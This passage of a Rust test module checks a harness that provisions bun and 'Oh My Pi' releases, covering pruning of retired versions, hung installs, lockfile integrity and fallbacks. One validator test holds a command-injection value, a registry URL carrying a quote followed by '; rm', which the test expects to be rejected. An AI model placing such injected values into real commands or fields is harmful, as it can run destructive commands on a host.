        assert_eq!(run(&old).omp, "omp/18.15.0");
        let old_dir = std::fs::canonicalize(hroot.join("omp/18.15.0")).unwrap();
        assert!(
            !old_dir.join(".retired").exists(),
            "a version's first install is current, not retired"
        );
        // A job provisioned on the old release: its launcher, where
        // provisioning writes it, names that release's link.
        let lay = |slot: &str| {
            let dir = hroot.join("jobs").join(slot);
            std::fs::create_dir_all(&dir).unwrap();
            let entry = hroot.join(format!(
                "omp/18.15.0/node_modules/{OMP_PACKAGE}/dist/cli.js"
            ));
            let text = launcher_script_with(
                JOB,
                work.to_str().unwrap(),
                bun.to_str().unwrap(),
                false,
                entry.to_str().unwrap(),
                &old,
            )
            .unwrap();
            script(&dir.join("omp"), text.trim_start_matches("#!/bin/sh\n"));
            dir
        };
        let job = lay(JOB);
        // The channel adopts a newer release: new jobs start on it.
        let rt = run(&new);
        assert_eq!(rt.omp, "omp/18.16.0");
        assert_eq!(rt.versions(), new);
        assert!(
            old_dir.join(".retired").exists(),
            "the old release is retired now"
        );
        // Two days on, the old release is still the running job's: kept, and
        // its launcher still starts it, not the new one.
        let ok = Command::new("touch")
            .args(["-d", "3 days ago"])
            .arg(old_dir.join(".retired"))
            .status()
            .unwrap();
        assert!(ok.success());
        run(&new);
        assert!(old_dir.exists(), "a job still holds it");
        let said = Command::new(job.join("omp"))
            .arg("--version")
            .output()
            .unwrap();
        assert_eq!(String::from_utf8_lossy(&said.stdout).trim(), "omp/18.15.0");
        // doctor's slot is not a job: a launcher it left there holds nothing.
        lay(DOCTOR_SLOT);
        // The job ends (teardown removes its harness dir): the old release goes.
        std::fs::remove_dir_all(&job).unwrap();
        run(&new);
        assert!(!old_dir.exists(), "pruned once no job holds it");
        assert!(!hroot.join("omp/18.15.0").exists(), "and its dangling link");
        assert!(hroot.join("omp/18.16.0").exists());
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[cfg(unix)]
    #[test]
    fn a_release_that_will_not_start_says_what_it_printed_and_leaves_nothing() {
        use std::process::Command;
        let tmp = scratch("nostart");
        let bin = tmp.join("bin");
        let hroot = tmp.join("harness");
        std::fs::create_dir_all(&bin).unwrap();
        // omp 18.13.3's own refusal, on a bun under its floor.
        let bun = tmp.join("oldbun");
        script(
            &bun,
            &format!(
                "if [ \"$1\" = --version ]; then echo 1.3.14; exit 0; fi\n\
                 if [ \"$1\" = install ]; then mkdir -p node_modules/{OMP_PACKAGE}/dist; : > node_modules/{OMP_PACKAGE}/dist/cli.js; exit 0; fi\n\
                 echo 'error: Bun runtime must be >= 1.4.4 (found v1.3.14)' >&2; exit 1"
            ),
        );
        place_bun(&tmp.join("xdg"), "1.3.14", &bun);
        let v = Versions {
            bun: "1.3.14".into(),
            omp: "18.16.0".into(),
        };
        let script = runtime_script_for(
            tmp.join("xdg").to_str().unwrap(),
            bin.to_str().unwrap(),
            hroot.to_str().unwrap(),
            &RuntimeRun::provision(&v),
            &BOUNDS,
        );
        let out = Command::new("sh").args(["-c", &script]).output().unwrap();
        assert!(!out.status.success());
        let err = String::from_utf8_lossy(&out.stderr);
        assert!(
            err.contains("does not start on bun 1.3.14: error: Bun runtime must be >= 1.4.4"),
            "{err}"
        );
        let left: Vec<_> = std::fs::read_dir(hroot.join("omp"))
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| !n.starts_with(".install.lock"))
            .collect();
        assert!(left.is_empty(), "no half install and no link: {left:?}");
        let _ = std::fs::remove_dir_all(&tmp);
    }

    /// The runtime script against a temp root with small bounds, as a
    /// provision (or a smoke test) runs it.
    #[cfg(unix)]
    fn run_script(
        tmp: &std::path::Path,
        run: &RuntimeRun,
        b: &Bounds,
        stdin: Option<&str>,
    ) -> std::process::Output {
        use std::io::Write;
        use std::process::{Command, Stdio};
        let script = runtime_script_checked(
            tmp.join("xdg").to_str().unwrap(),
            tmp.join("bin").to_str().unwrap(),
            tmp.join("harness").to_str().unwrap(),
            run,
            b,
        )
        .expect("plain inputs");
        let mut child = Command::new("sh")
            .args(["-c", &script])
            .stdin(if stdin.is_some() {
                Stdio::piped()
            } else {
                Stdio::null()
            })
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        if let Some(text) = stdin {
            child
                .stdin
                .take()
                .unwrap()
                .write_all(text.as_bytes())
                .unwrap();
        }
        child.wait_with_output().unwrap()
    }

    const QUICK: Bounds = Bounds {
        start_secs: 2,
        install_secs: 3,
        mise_secs: 3,
        lock_wait_secs: 4,
    };

    /// A stand-in bun for `bun_version` whose installs write a lockfile
    /// naming `sha512-TEST` (or keep the frozen one, noting it), and whose
    /// Oh My Pi answers the version its package.json asked for. `hang` makes
    /// `install` or the start (`start`) hang, after spawning a sleeper in a
    /// session of its own that would hold any fd it inherited.
    #[cfg(unix)]
    fn stand_in_bun(dir: &std::path::Path, bun_version: &str, hang: &str) -> std::path::PathBuf {
        let bun = dir.join(format!("bun-{bun_version}-{hang}"));
        let sleeper = format!(
            "setsid sleep 30 wbprov-sleeper-{} </dev/null >/dev/null 2>&1 &",
            std::process::id()
        );
        script(
            &bun,
            &format!(
                "if [ \"$1\" = --version ]; then echo {bun_version}; exit 0; fi\n\
                 if [ \"$1\" = install ]; then\n\
                   [ {hang} = install ] && {{ {sleeper} sleep 60; }}\n\
                   v=$(sed -n 's|.*\"{OMP_PACKAGE}\":\"\\([0-9.]*\\)\".*|\\1|p' package.json)\n\
                   mkdir -p node_modules/{OMP_PACKAGE}/dist; echo \"$v\" > node_modules/{OMP_PACKAGE}/dist/cli.js\n\
                   case \" $* \" in *' --frozen-lockfile '*) echo frozen > frozen.note ;; *) printf '{{\"omp\":\"%s\",\"integrity\":\"sha512-TEST\"}}\\n' \"$v\" > bun.lock ;; esac\n\
                   exit 0\n\
                 fi\n\
                 if [ \"$2\" = --version ] && [ -f \"$1\" ]; then\n\
                   [ {hang} = start ] && {{ {sleeper} sleep 60; }}\n\
                   echo \"omp/$(cat \"$1\")\"; exit 0\n\
                 fi\n\
                 exit 1"
            ),
        );
        bun
    }

    #[cfg(unix)]
    fn lock_is_free(hroot: &std::path::Path) -> bool {
        std::process::Command::new("flock")
            .args(["-n"])
            .arg(hroot.join("omp/.install.lock"))
            .arg("true")
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    #[cfg(unix)]
    fn kill_sleepers() {
        let _ = std::process::Command::new("pkill")
            .args(["-f", &format!("wbprov-sleeper-{}", std::process::id())])
            .status();
    }

    #[cfg(unix)]
    #[test]
    fn a_release_that_hangs_is_the_releases_and_never_keeps_the_install_lock() {
        let v = Versions {
            bun: HARNESS_BUN.into(),
            omp: "18.17.0".into(),
        };
        for (hang, said, phase) in [
            ("start", "did not finish starting within 2 s", "start"),
            ("install", "did not finish installing within 3 s", "timeout"),
        ] {
            let tmp = scratch(&format!("hang-{hang}"));
            let bun = stand_in_bun(&tmp, HARNESS_BUN, hang);
            place_bun(&tmp.join("xdg"), HARNESS_BUN, &bun);
            let t = std::time::Instant::now();
            let out = run_script(&tmp, &RuntimeRun::provision(&v), &QUICK, None);
            let err = String::from_utf8_lossy(&out.stderr);
            assert!(!out.status.success(), "{hang}: {err}");
            assert!(
                t.elapsed().as_secs() < 25,
                "{hang}: bounded, took {:?}",
                t.elapsed()
            );
            assert!(err.contains(said), "{hang}: {err}");
            assert_eq!(runtime_fault_phase(&err), Some(phase), "{hang}: {err}");
            // The sleeper the hung step left behind is still alive, in a
            // session of its own, and the install lock is free all the same.
            assert!(
                lock_is_free(&tmp.join("harness")),
                "{hang}: the lock is held"
            );
            // Nothing half-installed is left, and the next run takes the lock.
            let left: Vec<_> = std::fs::read_dir(tmp.join("harness/omp"))
                .unwrap()
                .filter_map(|e| e.ok())
                .map(|e| e.file_name().to_string_lossy().into_owned())
                .filter(|n| n.starts_with(".18") || n == "18.17.0")
                .collect();
            assert!(left.is_empty(), "{hang}: {left:?}");
            kill_sleepers();
            let _ = std::fs::remove_dir_all(&tmp);
        }
    }

    #[cfg(unix)]
    #[test]
    fn a_smoke_test_never_moves_the_volumes_shell_bun_and_a_provision_does_once_it_started() {
        let tmp = scratch("smoke-bun");
        let old = stand_in_bun(&tmp, HARNESS_BUN, "none");
        let new = stand_in_bun(&tmp, "1.4.5", "none");
        place_bun(&tmp.join("xdg"), HARNESS_BUN, &old);
        place_bun(&tmp.join("xdg"), "1.4.5", &new);
        let shell_bun = tmp.join("bin/bun");
        let installed = |v: &str| tmp.join(format!("xdg/mise/installs/bun/{v}/bin/bun"));
        let boot = Versions::bootstrap();
        let out = run_script(&tmp, &RuntimeRun::provision(&boot), &QUICK, None);
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(
            std::fs::read_link(&shell_bun).unwrap(),
            installed(HARNESS_BUN)
        );
        let cand = Versions {
            bun: "1.4.5".into(),
            omp: OMP_VERSION.into(),
        };
        let smoke = RuntimeRun {
            smoke: true,
            ..RuntimeRun::provision(&cand)
        };
        let out = run_script(&tmp, &smoke, &QUICK, None);
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let rt = parse_runtime(&String::from_utf8_lossy(&out.stdout)).unwrap();
        assert_eq!(
            rt.bun_path,
            installed("1.4.5").to_str().unwrap(),
            "the candidate ran by its own path"
        );
        assert_eq!(
            std::fs::read_link(&shell_bun).unwrap(),
            installed(HARNESS_BUN),
            "every shell's bun is still the verified one"
        );
        // Adopted: the next provision promotes it.
        let out = run_script(&tmp, &RuntimeRun::provision(&cand), &QUICK, None);
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(std::fs::read_link(&shell_bun).unwrap(), installed("1.4.5"));
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[cfg(unix)]
    #[test]
    fn the_current_and_fallback_installs_are_never_pruned_and_current_loses_a_stale_stamp() {
        use std::process::Command;
        let tmp = scratch("keep");
        let bun = stand_in_bun(&tmp, HARNESS_BUN, "none");
        place_bun(&tmp.join("xdg"), HARNESS_BUN, &bun);
        let pair = |omp: &str| Versions {
            bun: HARNESS_BUN.into(),
            omp: omp.into(),
        };
        let (a, b, c) = (pair("18.15.0"), pair("18.16.0"), pair("18.17.0"));
        for v in [&a, &b] {
            let out = run_script(&tmp, &RuntimeRun::provision(v), &QUICK, None);
            assert!(
                out.status.success(),
                "{}",
                String::from_utf8_lossy(&out.stderr)
            );
        }
        let dir = |v: &str| std::fs::canonicalize(tmp.join(format!("harness/omp/{v}"))).unwrap();
        let (da, db) = (dir("18.15.0"), dir("18.16.0"));
        let age = |p: &std::path::Path| {
            assert!(
                Command::new("touch")
                    .args(["-d", "5 days ago"])
                    .arg(p)
                    .status()
                    .unwrap()
                    .success()
            );
        };
        // B is current with A its fallback; both carry old stamps (another
        // version's run left them).
        std::fs::write(db.join(".retired"), "").unwrap();
        age(&db.join(".retired"));
        age(&da.join(".retired"));
        // A smoke test of C keeps both.
        let keep = vec!["18.16.0".to_string(), "18.15.0".to_string()];
        let smoke = RuntimeRun {
            smoke: true,
            keep: &keep,
            ..RuntimeRun::provision(&c)
        };
        let out = run_script(&tmp, &smoke, &QUICK, None);
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(
            da.exists() && db.exists(),
            "current and fallback survive a smoke test"
        );
        // A provision of B (current again) clears its stamp, and keeps A.
        let keep_a = vec!["18.15.0".to_string()];
        let prov = RuntimeRun {
            keep: &keep_a,
            ..RuntimeRun::provision(&b)
        };
        let out = run_script(&tmp, &prov, &QUICK, None);
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(
            !db.join(".retired").exists(),
            "current is current again: no stamp"
        );
        assert!(da.exists(), "the fallback is kept");
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[cfg(unix)]
    #[test]
    fn a_verified_lockfile_is_installed_frozen_and_a_mismatched_install_is_replaced() {
        let tmp = scratch("frozen");
        let bun = stand_in_bun(&tmp, HARNESS_BUN, "none");
        place_bun(&tmp.join("xdg"), HARNESS_BUN, &bun);
        let v = Versions::bootstrap();
        // The smoke test's own install writes a lockfile; npm's integrity
        // must be in it.
        let wrong = RuntimeRun {
            integrity: Some("sha512-OTHER"),
            ..RuntimeRun::provision(&v)
        };
        let out = run_script(&tmp, &wrong, &QUICK, None);
        let err = String::from_utf8_lossy(&out.stderr);
        assert!(
            !out.status.success() && err.contains("integrity is not the one npm documents"),
            "{err}"
        );
        let right = RuntimeRun {
            integrity: Some("sha512-TEST"),
            ..RuntimeRun::provision(&v)
        };
        let out = run_script(&tmp, &right, &QUICK, None);
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let link = tmp.join(format!("harness/omp/{OMP_VERSION}"));
        let first = std::fs::canonicalize(&link).unwrap();
        let verified = std::fs::read_to_string(first.join("bun.lock")).unwrap();
        // Frozen with that same lockfile: nothing to do.
        let frozen = RuntimeRun {
            frozen: true,
            ..RuntimeRun::provision(&v)
        };
        let out = run_script(&tmp, &frozen, &QUICK, Some(&verified));
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(std::fs::canonicalize(&link).unwrap(), first);
        // A volume whose install is not the verified tree is reinstalled
        // frozen, from the verified lockfile, beside the old one.
        let other = "{\"verified\":\"elsewhere\"}\n";
        let out = run_script(&tmp, &frozen, &QUICK, Some(other));
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let second = std::fs::canonicalize(&link).unwrap();
        assert_ne!(second, first);
        assert_eq!(
            std::fs::read_to_string(second.join("bun.lock")).unwrap(),
            other
        );
        assert!(
            second.join("frozen.note").exists(),
            "installed with --frozen-lockfile"
        );
        assert!(first.exists(), "the old install stays for whoever runs it");
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn the_fault_line_is_read_from_the_end() {
        assert_eq!(
            runtime_fault_phase("x\ntalaria-fault: start\n"),
            Some("start")
        );
        assert_eq!(
            runtime_fault_phase("talaria-fault: install\nmore\ntalaria-fault: host"),
            Some("host")
        );
        assert_eq!(runtime_fault_phase("docker exec c …: timed out"), None);
        assert!(
            plain_integrity("sha512-abc+/=")
                && !plain_integrity("sha512-a b")
                && !plain_integrity("md5-x")
        );
        assert!(plain_registry("https://npm.example.com/r/") && !plain_registry("https://x\"; rm"));
    }

    #[test]
    fn a_volume_that_refused_the_verified_pair_goes_straight_to_the_fallback_then_the_bootstrap() {
        let st = json!({
            "current": { "bun": "1.4.5", "omp": "18.17.0" },
            "previous": { "bun": "1.4.4", "omp": "18.16.5" },
            "volumes": { "eng": { "refused": { "bun": "1.4.5", "omp": "18.17.0" }, "error": "no disk" } },
        });
        let p = |b: &str, o: &str| Versions {
            bun: b.into(),
            omp: o.into(),
        };
        let (all, skipped) = attempts_from(Some(&st), "ops");
        assert_eq!(
            all,
            vec![
                p("1.4.5", "18.17.0"),
                p("1.4.4", "18.16.5"),
                Versions::bootstrap()
            ]
        );
        assert!(skipped.is_none());
        let (eng, skipped) = attempts_from(Some(&st), "eng");
        assert_eq!(eng, vec![p("1.4.4", "18.16.5"), Versions::bootstrap()]);
        assert!(skipped.unwrap().contains("no disk"));
        // A refusal of some older pair says nothing about the current one.
        let st2 = json!({
            "current": { "bun": "1.4.5", "omp": "18.17.0" },
            "volumes": { "eng": { "refused": { "bun": "1.4.4", "omp": "18.16.0" } } },
        });
        assert_eq!(attempts_from(Some(&st2), "eng").0[0], p("1.4.5", "18.17.0"));
        // Nothing verified: the bootstrap alone.
        assert_eq!(attempts_from(None, "eng").0, vec![Versions::bootstrap()]);
        let e = effective_from(Some(&st));
        assert_eq!(e.keep(), vec!["18.17.0".to_string(), "18.16.5".to_string()]);
    }

    #[test]
    fn a_mirror_reaches_bun_install_with_the_slash_bun_needs() {
        let v = Versions::bootstrap();
        let run = RuntimeRun {
            registry: Some("https://npm.example.com/mirror"),
            ..RuntimeRun::provision(&v)
        };
        let s = harness_runtime_script(&run).unwrap();
        assert!(
            s.contains("export BUN_CONFIG_REGISTRY=\"https://npm.example.com/mirror/\""),
            "{s}"
        );
        let none = harness_runtime_script(&RuntimeRun::provision(&v)).unwrap();
        assert!(
            none.contains("if [ -n \"\" ]; then export BUN_CONFIG_REGISTRY"),
            "no mirror, no override"
        );
    }
}
